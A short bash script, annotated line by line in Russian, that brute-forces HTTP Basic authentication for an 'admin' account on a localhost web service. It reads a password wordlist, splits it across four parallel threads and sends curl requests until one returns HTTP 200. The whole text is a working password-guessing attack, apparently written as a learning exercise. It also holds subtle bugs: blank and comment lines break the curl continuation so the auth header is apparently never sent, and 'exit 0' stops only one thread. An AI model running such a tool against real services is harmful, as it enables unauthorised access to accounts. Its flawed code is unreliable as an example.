#!/bin/bash

URL="http://localhost:8080/"
USER="admin"
WORDLIST="passwords.txt"
THREADS=4

# Function for each thread
brute_thread() {
    local start=$1
# начальная строка словаря
    local end=$2
# конечная строка словаря
    local thread_id=$3
# номер потока

# создаёт три аргумента local start/end/thread_id которые будут использоваться теми аргументами которые функция принимает - $1 $2 $3
    
    for ((i=start; i<end; i++)); do

# идём от start до end с шагом 1

        password=$(sed -n "${i}p" "$WORDLIST")

# sed -n подавляет обычный вывод
# ${i}p печатает только строку с номер i из файла $WORDLIST
# результат сохраняется в password 

        auth=$(printf "%s:%s" "$USER" "$password" | base64 | tr -d '\n')

# Формирует Basic-авторизацию:
# 1. printf "%s:%s" склеивает user:password
# 2. base64 кодирует в Base64
# 3. tr -d '\n' удаляет символ перевода строки, который мог добавить base64. Результат сохраняется в auth.
        
        response=$(curl -s -o /dev/null -w "%{http_code}" \


# Выполняет curl с опциями:

# -s (silent) — не показывать прогресс и ошибки
# -o /dev/null — выбросить тело ответа
# -w "%{http_code}" — вывести только HTTP-код ответа

                   -H "Authorization: Basic $auth" "$URL" 2>/dev/null)
        
        if [ "$response" = "200" ]; then
            echo "THREAD $thread_id FOUND: $password"
            exit 0
        fi
    done
}

# Main
total=$(wc -l < "$WORDLIST")
chunk=$((total / THREADS))

for ((t=0; t<THREADS; t++)); do
    start=$((t * chunk + 1))
    end=$(( (t + 1) * chunk + 1 ))
    [ $t -eq $((THREADS - 1)) ] && end=$((total + 1))
    
    brute_thread $start $end $t &
done

wait
